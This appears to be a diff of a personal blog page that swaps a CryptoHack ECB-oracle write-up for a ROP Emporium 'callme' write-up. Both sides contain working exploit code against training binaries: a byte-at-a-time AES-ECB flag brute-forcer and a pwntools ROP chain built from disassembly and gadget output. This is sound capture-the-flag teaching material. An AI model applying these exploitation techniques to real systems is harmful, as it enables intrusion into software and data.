@@ -5,37 +5,37 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
-        <title>Crypto - ECB oracle - w-disaster blog</title><meta name="Description" content="ECB oracle"><meta property="og:title" content="Crypto - ECB oracle" />
-<meta property="og:description" content="ECB oracle" />
+        <title>ROP - Callme - w-disaster blog</title><meta name="Description" content="Callme challenge from ropemporium.com"><meta property="og:title" content="ROP - Callme" />
+<meta property="og:description" content="Callme challenge from ropemporium.com" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://w-disaster.github.io/ecb-oracle/" />
+<meta property="og:url" content="https://w-disaster.github.io/callme/" />
 <meta property="og:image" content="https://w-disaster.github.io/logo.png"/>
-<meta property="article:published_time" content="2022-04-07T22:00:00+02:00" />
+<meta property="article:published_time" content="2022-05-12T17:02:00+02:00" />
 <meta property="article:modified_time" content="2022-05-13T14:08:21+02:00" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://w-disaster.github.io/logo.png"/>
 
-<meta name="twitter:title" content="Crypto - ECB oracle"/>
-<meta name="twitter:description" content="ECB oracle"/>
+<meta name="twitter:title" content="ROP - Callme"/>
+<meta name="twitter:description" content="Callme challenge from ropemporium.com"/>
 <meta name="application-name" content="Blog">
 <meta name="apple-mobile-web-app-title" content="Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://w-disaster.github.io/ecb-oracle/" /><link rel="prev" href="https://w-disaster.github.io/password-as-keys/" /><link rel="next" href="https://w-disaster.github.io/callme/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://w-disaster.github.io/callme/" /><link rel="prev" href="https://w-disaster.github.io/ecb-oracle/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "Crypto - ECB oracle",
+        "headline": "ROP - Callme",
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/w-disaster.github.io\/ecb-oracle\/"
-        },"image": ["https:\/\/w-disaster.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "crypto, exploit, aes, ecb","wordcount":  489 ,
-        "url": "https:\/\/w-disaster.github.io\/ecb-oracle\/","datePublished": "2022-04-07T22:00:00+02:00","dateModified": "2022-05-13T14:08:21+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@id": "https:\/\/w-disaster.github.io\/callme\/"
+        },"image": ["https:\/\/w-disaster.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "returned-oriented programming, rop","wordcount":  896 ,
+        "url": "https:\/\/w-disaster.github.io\/callme\/","datePublished": "2022-05-12T17:02:00+02:00","dateModified": "2022-05-13T14:08:21+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/w-disaster.github.io\/images\/avatar.png"},"author": {
                 "@type": "Person",
                 "name": "w-disaster"
-            },"description": "ECB oracle"
+            },"description": "Callme challenge from ropemporium.com"
     }
     </script></head>
     <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
@@ -104,10 +104,10 @@
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animated flipInX">Crypto - ECB oracle</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>w-disaster</a></span>&nbsp;<span class="post-category">included in <a href="/categories/crypto/"><i class="far fa-folder fa-fw"></i>Crypto</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-04-07">2022-04-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;489 words&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;<span id="/ecb-oracle/" class="leancloud_visitors" data-flag-title="Crypto - ECB oracle">
+        </div><article class="page single"><h1 class="single-title animated flipInX">ROP - Callme</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>w-disaster</a></span>&nbsp;<span class="post-category">included in <a href="/categories/rop/"><i class="far fa-folder fa-fw"></i>ROP</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-05-12">2022-05-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;896 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;<span id="/callme/" class="leancloud_visitors" data-flag-title="ROP - Callme">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                     </span>&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
@@ -118,14 +118,49 @@
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
     <li><a href="#description">Description</a></li>
+    <li><a href="#how-to-build-the-rop-chain">How to build the ROP chain</a></li>
     <li><a href="#exploit">Exploit</a></li>
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h2 id="description">Description</h2>
-<p>This challenge has been taken from <a href="http://aes.cryptohack.org/ecb_oracle/">http://aes.cryptohack.org/ecb_oracle/</a>.
-What we have is an function that concats the FLAG to a plaintext given as parameter
-and encrypts it through EAS in ECB mode.</p>
-<p>Here&rsquo;s <code>chall.py</code>:</p>
+<p>This challenge has been taken from <a href="https://ropemporium.com/challenge/callme.html">https://ropemporium.com/challenge/callme.html</a>.
+The purpose is to change the flow of execution such that the functions <code>callme_one, callme_two,</code> and <code>callme_three</code> are called in sequence with <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code>, and <code>0xd00df00dd00df00d</code> as parameters for each of them.
+More information in the linked website.</p>
+<h2 id="how-to-build-the-rop-chain">How to build the ROP chain</h2>
+<p>Download the challenge:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl --output callme.zip https://ropemporium.com/binary/callme.zip
+unzip callme.zip &amp;&amp; rm callme.zip
+</code></pre></td></tr></table>
+</div>
+</div><p>First, let&rsquo;s see the function written by the programmer:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">rabin2 -qs callme | grep -ve imp -e &#39; 0 &#39;
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>0x00601070 8 stdout</p>
+<p>0x00601078 1 completed.7698</p>
+<p>0x00400898 90 pwnme</p>
+<p>0x004008f2 74 usefulFunction</p>
+<p>0x004009b0 2 __libc_csu_fini</p>
+<p>0x00601070 8 stdout@@GLIBC_2.2.5</p>
+<p>0x004009c0 4 _IO_stdin_used</p>
+<p>0x00400940 101 __libc_csu_init</p>
+<p>0x00400790 2 _dl_relocate_static_pie</p>
+<p>0x00400760 43 _start</p>
+<p>0x00400847 81 main</p>
+</blockquote>
+<p>Enter to pwndbg (<code>gdb-pwndbg callme</code>) and disassemble <code>pwnme</code> and <code>usefulFunction</code> since we&rsquo;re interested in them:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt"> 1
@@ -156,57 +191,182 @@ and encrypts it through EAS in ECB mode.</p>
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python3</span>
-
-<span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">FLAG</span>
-<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
-<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
-<span class="kn">import</span> <span class="nn">os</span>
-
-<span class="n">KEY</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">):</span>
-    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">plaintext</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
-    <span class="c1"># concat plaintext with 16 - len(plaintext) bytes </span>
-    <span class="c1"># with value 16 - len(plaintext)</span>
-    <span class="n">padded</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">plaintext</span> <span class="o">+</span> <span class="n">FLAG</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
-    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">padded</span><span class="p">)</span>
-    <span class="k">except</span> <span class="ne">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}</span>
-
-    <span class="k">return</span> <span class="n">encrypted</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-        <span class="n">plain</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;encrypt&gt; &#34;</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">plain</span><span class="p">)))</span>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">pwndbg disass pwnme
+Dump of assembler code for function pwnme:
+   0x0000000000400898 &lt;+0:     push   rbp
+   0x0000000000400899 &lt;+1:     mov    rbp,rsp
+   0x000000000040089c &lt;+4:     sub    rsp,0x20
+   0x00000000004008a0 &lt;+8:     lea    rax,[rbp-0x20]
+   0x00000000004008a4 &lt;+12:    mov    edx,0x20
+   0x00000000004008a9 &lt;+17:    mov    esi,0x0
+   0x00000000004008ae &lt;+22:    mov    rdi,rax
+   0x00000000004008b1 &lt;+25:    call   0x400700 &lt;memset@plt
+   0x00000000004008b6 &lt;+30:    mov    edi,0x4009f0
+   0x00000000004008bb &lt;+35:    call   0x4006d0 &lt;puts@plt
+   0x00000000004008c0 &lt;+40:    mov    edi,0x400a13
+   0x00000000004008c5 &lt;+45:    mov    eax,0x0
+   0x00000000004008ca &lt;+50:    call   0x4006e0 &lt;printf@plt
+   0x00000000004008cf &lt;+55:    lea    rax,[rbp-0x20]
+   0x00000000004008d3 &lt;+59:    mov    edx,0x200
+   0x00000000004008d8 &lt;+64:    mov    rsi,rax
+   0x00000000004008db &lt;+67:    mov    edi,0x0
+   0x00000000004008e0 &lt;+72:    call   0x400710 &lt;read@plt
+   0x00000000004008e5 &lt;+77:    mov    edi,0x400a16
+   0x00000000004008ea &lt;+82:    call   0x4006d0 &lt;puts@plt
+   0x00000000004008ef &lt;+87:    nop
+   0x00000000004008f0 &lt;+88:    leave  
+   0x00000000004008f1 &lt;+89:    ret    
+End of assembler dump.
+</code></pre></td></tr></table>
+</div>
+</div><p>As we can see there&rsquo;s a <code>rax,[rbp-0x20]</code> instruction before the read operation. Here <code>0x20</code> is subtracted from <code>rbp</code> since they&rsquo;re the bytes allocated to store the input string (32 bytes): if more chars are inserted it&rsquo;s possible to overwrite the return address of this function, so this is the point where the flow of execution will be changed by us.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">pwndbg disass usefulFunction
+Dump of assembler code for function usefulFunction:
+   0x00000000004008f2 &lt;+0:     push   rbp
+   0x00000000004008f3 &lt;+1:     mov    rbp,rsp
+   0x00000000004008f6 &lt;+4:     mov    edx,0x6
+   0x00000000004008fb &lt;+9:     mov    esi,0x5
+   0x0000000000400900 &lt;+14:    mov    edi,0x4
+   0x0000000000400905 &lt;+19:    call   0x4006f0 &lt;callme_three@plt
+   0x000000000040090a &lt;+24:    mov    edx,0x6
+   0x000000000040090f &lt;+29:    mov    esi,0x5
+   0x0000000000400914 &lt;+34:    mov    edi,0x4
+   0x0000000000400919 &lt;+39:    call   0x400740 &lt;callme_two@plt
+   0x000000000040091e &lt;+44:    mov    edx,0x6
+   0x0000000000400923 &lt;+49:    mov    esi,0x5
+   0x0000000000400928 &lt;+54:    mov    edi,0x4
+   0x000000000040092d &lt;+59:    call   0x400720 &lt;callme_one@plt
+   0x0000000000400932 &lt;+64:    mov    edi,0x1
+   0x0000000000400937 &lt;+69:    call   0x400750 &lt;exit@plt
+End of assembler dump.
+</code></pre></td></tr></table>
+</div>
+</div><p>This function is useful because:</p>
+<ul>
+<li>we can see that edx, esi, edi are the three registers used to store the parameters</li>
+<li>it contains the instruction addresses of the function calls (<code>callme_one, callme_two, callme_three</code>).</li>
+</ul>
+<p>Since it&rsquo;s necessary to store values into edx, esi, edi, we need to find gadgets in the executables e.g. instructions which pop values in those registers and ends with a ret. <code>ropper</code> is a useful tool to find the available ones:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">ropper -f callme
+</code></pre></td></tr></table>
+</div>
+</div><p>We can note that there&rsquo;s a gadget which it&rsquo;s the one we was looking for:</p>
+<p><code>0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; </code></p>
+<p>Now we have all the elements to build a rop chain.
+Here&rsquo;s how the stack should be structured before the ret instruction in the <code>pwnme</code> function:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">|                    |
+|                    |
+|      p_gadget      |
+| 0xdeadbeefdeadbeef |
+| 0xcafebabecafebabe |
+| 0xd00df00dd00df00d |
+|     callme_one     |
+|      p_gadget      |
+| 0xdeadbeefdeadbeef |
+| 0xcafebabecafebabe |
+| 0xd00df00dd00df00d |
+|     callme_two     |
+|      p_gadget      |
+| 0xdeadbeefdeadbeef |
+| 0xcafebabecafebabe |
+| 0xd00df00dd00df00d |
+|    callme_three    |
+----------------------
+          |
+          V
+|                    |
+|                    |
+| 0x000000000040093c |
+| 0xdeadbeefdeadbeef |
+| 0xcafebabecafebabe |
+| 0xd00df00dd00df00d |
+| 0x0000000000400720 |
+| 0x000000000040093c |
+| 0xdeadbeefdeadbeef |
+| 0xcafebabecafebabe |
+| 0xd00df00dd00df00d |
+| 0x0000000000400740 |
+| 0x000000000040093c |
+| 0xdeadbeefdeadbeef |
+| 0xcafebabecafebabe |
+| 0xd00df00dd00df00d |
+| 0x00000000004006f0 |
+----------------------
+        STACK
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="exploit">Exploit</h2>
-<p>Let&rsquo;s first take a look how AES ECB works:</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="./aes-ecb-enc.png"
-        data-srcset="./aes-ecb-enc.png, ./aes-ecb-enc.png 1.5x, ./aes-ecb-enc.png 2x"
-        data-sizes="auto"
-        alt="./aes-ecb-enc.png"
-        title="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/1920px-ECB_encryption.svg.png" /></p>
-<p>We can state that:</p>
-<ul>
-<li>The flag is concatenated after the plaintext input;</li>
-<li>ECB encodes blocks of 16 bytes with the same key;</li>
-<li>The flag is 26 chars long.</li>
-</ul>
-<p>The main idea to exploit this bad implementation is to start to encode a string of:
-$$\Bigl \lceil \dfrac{\text{flagSize}}{\text{blockSize}} \Bigr \rceil * \text{blockSize} - 1$$</p>
-<p>bytes, so in this case of 31. If we do so, there&rsquo;s the first char of the flag that gets encrypted in the last byte of the second block. In order to solve this challenge we can brute force this last char and then repeat the process for the remaining characters decreasing the input plaintext.</p>
-<p>For instance, first plaintext that the oracle encrypts is the following one:</p>
-<p>$$\text{Oracle}(\text{&ldquo;A&rdquo;} * 31 + \text{flag} + \text{padding}) \newline= E(\text{&ldquo;A&rdquo;} * 16) + E(\text{&ldquo;A&rdquo;} * 15 + ch_1) + E(ch_2 + &hellip; + ch_n +  \text{padding})$$</p>
-<p>Proceed finding the next chars decrementing the size of the &ldquo;A&rdquo;&lsquo;s until the entire flag is known.</p>
-<p><code>Exploit.py</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt"> 1
@@ -249,55 +409,71 @@ $$\Bigl \lceil \dfrac{\text{flagSize}}{\text{blockSize}} \Bigr \rceil * \text{bl
 </span><span class="lnt">38
 </span><span class="lnt">39
 </span><span class="lnt">40
+</span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
-<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span> 
-<span class="kn">import</span> <span class="nn">string</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">process</span>
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">pwn</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./chall.py&#34;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./callme&#34;</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">recvuntil_sendl</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">ustring</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">ustring</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-    <span class="n">a</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-    <span class="c1"># remove b and &#39;&#39; on the sides of the encrypted text </span>
-    <span class="n">a</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>   
-    <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
+<span class="n">gdb_cmd</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s1">&#39;set disassembly-flavor intel&#39;</span><span class="p">,</span>
+        <span class="c1">#&#39;b *0x0000000000400735&#39;,</span>
+        <span class="c1">#&#39;b *0x0000000000400741&#39;,</span>
+        <span class="s1">&#39;c&#39;</span><span class="p">,</span>
+        <span class="p">]</span>
 
-<span class="k">def</span> <span class="nf">getflag</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
-    <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">):</span>
-        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span>
-        <span class="n">answer</span> <span class="o">=</span> <span class="n">recvuntil_sendl</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s2">&#34;encrypt&gt; &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> 
-        
-        <span class="c1"># brute force the char</span>
-        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
-            <span class="n">bf</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">s</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">gdb_cmd</span><span class="p">))</span>
 
-            <span class="n">bf_answer</span> <span class="o">=</span> <span class="n">recvuntil_sendl</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s2">&#34;encrypt&gt; &#34;</span><span class="p">,</span> <span class="n">bf</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">build_callme_payload</span><span class="p">(</span><span class="n">p_callme</span><span class="p">):</span>
+    <span class="c1"># rdi: first param</span>
+    <span class="c1"># rsi: second &#34;</span>
+    <span class="c1"># rdx: third &#34;</span>
 
-            <span class="c1"># each hex is two char so compare until 32 * 2</span>
-            <span class="k">if</span> <span class="n">bf_answer</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">32</span> <span class="o">*</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">answer</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">32</span> <span class="o">*</span> <span class="mi">2</span><span class="p">]:</span>
-                <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">s</span>
-                <span class="k">break</span>
+    <span class="n">rdi</span> <span class="o">=</span> <span class="mh">0xdeadbeefdeadbeef</span>
+    <span class="n">rsi</span> <span class="o">=</span> <span class="mh">0xcafebabecafebabe</span>
+    <span class="n">rdx</span> <span class="o">=</span> <span class="mh">0xd00df00dd00df00d</span>
+    <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">p_callme</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<span class="c1"># 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; </span>
+<span class="n">p_gadget</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040093c</span><span class="p">)</span>
 
+<span class="c1"># start building payload</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p_gadget</span> <span class="o">*</span> <span class="mi">6</span>
+<span class="c1"># Callme One</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">build_callme_payload</span><span class="p">(</span><span class="mh">0x400720</span><span class="p">)</span>
+<span class="c1"># Callme Two</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">build_callme_payload</span><span class="p">(</span><span class="mh">0x400740</span><span class="p">)</span>
+<span class="c1"># Callme three</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">build_callme_payload</span><span class="p">(</span><span class="mh">0x4006f0</span><span class="p">)</span>
 
-<span class="n">getflag</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&gt;&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><code>python3 exploit.py</code></p>
-<blockquote>
-<p>[+] Starting local process &lsquo;./chall.py&rsquo;: pid 38213<br>
-flag{4tt3nt1_4d_u54r3_3cb}<br>
-[*] Stopped process &lsquo;./chall.py&rsquo; (pid 38213)</p>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">python3 exploit.py
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
